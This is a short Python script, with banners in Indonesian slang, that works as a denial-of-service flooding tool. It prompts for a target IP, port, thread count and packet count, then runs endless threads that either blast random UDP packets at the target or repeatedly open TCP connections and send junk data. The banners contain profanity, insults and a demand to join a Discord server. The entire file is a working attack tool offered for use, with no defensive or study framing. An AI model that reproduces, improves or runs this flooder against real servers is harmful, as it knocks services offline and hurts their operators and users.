import random
import socket
import threading

print       (" - - > Udinz × Xvall Ni Boss< - - ")
print       (" - - > UdinZ × Xvall Nih boss < - - ")
print       (" - - > Jangan Di Buat abuse kontol < - - ")
print       (" - - >UdinZ × Xvall Nih bos <- - ")                                   
print       (" - - > KALO MAU RENAME PM GUA DULU NGENTOD < - - ")
print       (" - - > PENCET LINK DIBAWAH AJG < - - ")
print       (" - - > discord.gg/pornhub< - - ")
print       (" - - > GA JOIN = ANAK HARAM < - - ")
    
ip = str(input("  Ip server yang mau lo ddso:"))
port = int(input(" Port server yang mau lo ddos:"))
choice = str(input(" DDOS GA NIH ? (y/n):"))
times = int(input(" MAU BERAPA PAKET JNE:"))
threads = int(input(" KIRIM BERAPA BARANG  NYA :"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"UdinZ × Xvall nih bos ")
		except:
			print("[!] GASUKA BAYWAN DECK")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" UdinZ × Xvall Ni boss! ")
		except:
			s.close()
			print("[*] GASUKA BAYWAN DECK")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
